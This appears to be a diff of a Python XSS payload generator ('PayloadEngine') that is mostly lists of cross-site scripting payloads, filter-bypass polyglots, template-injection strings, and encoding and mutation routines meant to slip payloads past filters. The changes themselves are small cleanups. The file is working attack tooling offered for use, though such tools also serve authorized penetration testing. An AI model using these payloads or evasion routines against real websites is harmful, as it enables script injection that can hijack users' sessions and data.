@@ -12,11 +12,11 @@ from typing import List, Dict
 
 class PayloadEngine:
     """Advanced XSS Payload Generation Engine"""
-    
+
     def __init__(self):
         self.payloads = self._load_payloads()
         self.encoders = self._load_encoders()
-        
+
     def _load_payloads(self) -> Dict[str, List[str]]:
         """Load comprehensive payload database"""
         return {
@@ -46,7 +46,7 @@ class PayloadEngine:
                 "<marquee onstart=alert('XSS')>",
                 "<details open ontoggle=alert('XSS')>",
                 "<select onfocus=alert('XSS') autofocus>",
-                "<video><source onerror=alert('XSS')>",
+                "<video><source onerror=alert('XSS')></video>",
                 "<audio src=x onerror=alert('XSS')>",
                 "<input onfocus=alert('XSS') autofocus>",
                 "<textarea onfocus=alert('XSS') autofocus>",
@@ -56,8 +56,8 @@ class PayloadEngine:
                 "<embed src=javascript:alert('XSS')>",
             ],
             'polyglots': [
-                "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",
-                "'\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script><img/id=\"confirm&lpar;1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>",
+                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",
+                "'\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->\" ></script><script>alert(1)</script><img/id=\"confirm&lpar;1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29);>",
                 "\"><img src=x onerror=window['al'+'ert'](1)>",
                 "'-confirm(1)-'",
                 "'-confirm(1)//",
@@ -139,7 +139,7 @@ class PayloadEngine:
                 "{{this.constructor.constructor('alert(1)')()}}",
             ],
         }
-    
+
     def _load_encoders(self) -> Dict[str, callable]:
         """Load encoding functions"""
         return {
@@ -148,25 +148,23 @@ class PayloadEngine:
             'html_entities': lambda x: ''.join(f'&#{ord(c)};' for c in x),
             'hex_entities': lambda x: ''.join(f'&#x{ord(c):x};' for c in x),
             'base64': lambda x: base64.b64encode(x.encode()).decode(),
-            'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
             'null_bytes': lambda x: x.replace('<', '%00<'),
             'case_random': self._random_case,
         }
-    
+
     def _random_case(self, payload: str) -> str:
         """Randomize case of letters"""
         return ''.join(c.upper() if random.choice([True, False]) else c.lower() 
                       for c in payload if c.isalpha()) or payload
-    
+
     def get_payloads_for_context(self, context: str) -> List[str]:
         """Get payloads appropriate for context"""
         all_payloads = []
-        
-        # Add basic and advanced payloads for all contexts
+
         all_payloads.extend(self.payloads['basic'])
         all_payloads.extend(self.payloads['advanced'])
         all_payloads.extend(self.payloads['polyglots'])
-        
+
         if context == 'dom':
             all_payloads.extend(self.payloads['dom'])
         elif context == 'blind':
@@ -181,9 +179,9 @@ class PayloadEngine:
             all_payloads.extend(self.payloads['angular'])
             all_payloads.extend(self.payloads['react'])
             all_payloads.extend(self.payloads['vue'])
-            
-        return list(set(all_payloads))  # Remove duplicates
-    
+
+        return list(set(all_payloads))
+
     def encode_payload(self, payload: str, encoding: str = 'all') -> List[str]:
         """Generate encoded variations of payload"""
         if encoding == 'all':
@@ -197,24 +195,19 @@ class PayloadEngine:
         elif encoding in self.encoders:
             return [self.encoders[encoding](payload)]
         return [payload]
-    
+
     def mutate_payload(self, payload: str) -> List[str]:
         """Apply various mutations to payload"""
         mutations = [payload]
-        
-        # Add spaces variations
+
         mutations.append(payload.replace(' ', '/**/'))
         mutations.append(payload.replace(' ', '%09'))
         mutations.append(payload.replace(' ', '%0a'))
         mutations.append(payload.replace(' ', '%0d'))
-        
-        # Add quote variations
         mutations.append(payload.replace("'", '"'))
         mutations.append(payload.replace('"', "'"))
         mutations.append(payload.replace("'", '`'))
-        
-        # Add protocol variations
         mutations.append(payload.replace('javascript:', 'jaVascript:'))
         mutations.append(payload.replace('javascript:', 'javascript%3a'))
-        
+
         return list(set(mutations))
